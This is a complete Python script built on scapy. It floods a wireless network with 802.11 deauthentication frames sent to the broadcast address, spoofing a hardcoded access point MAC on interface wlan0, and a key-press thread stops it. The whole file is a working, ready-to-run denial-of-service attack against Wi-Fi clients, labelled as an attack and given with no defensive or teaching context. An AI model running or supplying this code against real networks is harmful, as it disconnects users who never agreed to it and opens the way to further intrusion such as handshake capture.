from scapy.all import *
import time
import threading
import keyboard  

# Flag to control the attack loop
running = True

def send_deauth(ap_mac, client_mac, interface):
    global running
    pkt = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    print("Press 'S' to stop the attack...")
    
    while running:  # Run while the flag is True
        sendp(pkt, iface=interface, count=10, inter=0.2, verbose=0)
        print("Deauthentication packet sent")
        time.sleep(0.5)
    
    print("Attack stopped.")

# Function to monitor key press
def monitor_key():
    global running
    while running:
        if keyboard.is_pressed('s'):  # Check if 'S' is pressed
            running = False


# Create a thread to monitor the key press
key_thread = threading.Thread(target=monitor_key)
key_thread.start()

ap_mac = "C8:3A:35:28:47:50"  # Access Point MAC
client_mac = "FF:FF:FF:FF:FF:FF"  # Client MAC or Broadcast
interface = "wlan0"

# Start the attack
send_deauth(ap_mac, client_mac, interface)
key_thread.join()

